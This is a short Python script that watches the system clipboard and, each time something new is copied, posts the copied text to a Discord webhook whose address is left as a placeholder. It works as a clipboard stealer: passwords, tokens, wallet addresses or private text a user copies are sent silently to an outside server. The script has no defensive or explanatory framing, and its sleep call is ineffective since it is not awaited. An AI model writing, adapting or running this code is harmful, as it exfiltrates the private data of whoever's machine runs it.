import pyperclip
import requests
import asyncio

webhook = "DISCORDWEBHOOKHERE"

while True:
    ez = pyperclip.waitForNewPaste()
    payload = {
        "embeds": [
            {
                "title": "ClipBoard Paste sender",
                "description": ez
            }
        ]
    }
    response = requests.post(webhook, json=payload)
    asyncio.sleep(0.5)
